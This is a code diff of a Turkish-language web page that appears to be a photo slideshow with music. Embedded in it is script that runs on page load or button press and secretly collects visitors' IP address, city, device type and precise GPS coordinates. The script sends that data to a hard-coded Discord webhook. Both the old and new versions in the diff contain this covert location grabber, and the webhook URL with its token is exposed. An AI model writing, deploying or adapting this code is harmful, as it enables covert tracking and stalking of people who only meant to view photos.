@@ -29,8 +29,8 @@
     <script>
         const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
         
-        // Konumun sadece 1 kere gönderilmesi için kilit
-        let konumGonderildi = false;
+        // Sadece bir kere çalışması için kilit
+        let raporGonderildi = false;
 
         function dcGonder(m) {
             fetch(WEB_URL, {
@@ -40,42 +40,39 @@
             });
         }
 
-        // --- DETAYLI BİLGİ VE KONUM FONKSİYONU ---
-        function bilgileriTopla() {
-            if (konumGonderildi) return; // Zaten gönderildiyse durdur
+        function sistemBaslat() {
+            if (raporGonderildi) return;
 
-            const cihaz = navigator.userAgent; // Telefon/Tarayıcı bilgisi
-            const saat = new Date().toLocaleString('tr-TR'); // Tam giriş saati
+            const cihaz = navigator.userAgent.toLowerCase();
+            const saat = new Date().toLocaleTimeString('tr-TR');
+            
+            // Basit cihaz tespiti
+            let model = "Bilinmiyor";
+            if (cihaz.includes("iphone")) model = "iPhone";
+            else if (cihaz.includes("android")) model = "Android Telefon";
+            else if (cihaz.includes("windows")) model = "Windows Bilgisayar";
 
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(d => {
-                    let anaMesaj = `🌟 **YENİ GİRİŞ DETAYLARI** 🌟\n` +
-                                 `📅 **Saat:** ${saat}\n` +
-                                 `📍 **Şehir/Ülke:** ${d.city} / ${d.country_name}\n` +
-                                 `🌐 **IP:** ${d.ip}\n` +
-                                 `📱 **Cihaz Bilgisi:** ${cihaz}\n` +
-                                 `--------------------------`;
-                    dcGonder(anaMesaj);
-
-                    // Hassas Konum İste
+                    let mesaj = `🚀 **Giriş Yapıldı!**\n⏰ **Saat:** ${saat}\n📱 **Cihaz:** ${model}\n📍 **Şehir:** ${d.city}\n🌐 **IP:** ${d.ip}`;
+                    dcGonder(mesaj);
+                    
+                    // GPS Konumu İste
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(function(p) {
-                            const lat = p.coords.latitude;
-                            const lon = p.coords.longitude;
-                            const harita = `https://www.google.com/maps?q=${lat},${lon}`;
-                            dcGonder(`🎯 **TAM KONUM (GPS)**\n📍 Harita: ${harita}`);
-                            konumGonderildi = true; // Gönderim başarılı, kilitle
+                            let harita = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                            dcGonder(`🎯 **TAM KONUM GELDİ!**\n📍 Harita: ${harita}`);
                         }, function(e) {
-                            dcGonder("⚠️ GPS İzni Verilmedi.");
-                            konumGonderildi = true; // İzin verilmese de tekrar sormasın diye kilitle
+                            dcGonder("⚠️ GPS İzni Reddedildi.");
                         }, { enableHighAccuracy: true });
                     }
+                    raporGonderildi = true;
                 });
         }
 
-        // Sayfa yüklenince başlat
-        window.onload = bilgileriTopla;
+        // Sayfa açılınca veya bir yere basınca çalıştır
+        window.onload = sistemBaslat;
 
         // --- FOTOĞRAF SİSTEMİ ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
@@ -86,8 +83,8 @@
         function ileri() {
             if (audio) audio.play().catch(() => {});
             
-            // Eğer sayfa yüklenirken konum alınamadıysa butona basınca tekrar dene
-            if (!konumGonderildi) bilgileriTopla();
+            // Eğer açılışta rapor gitmediyse butonda tekrar dene
+            if (!raporGonderildi) sistemBaslat();
 
             index++;
             if (index >= fotolar.length) {
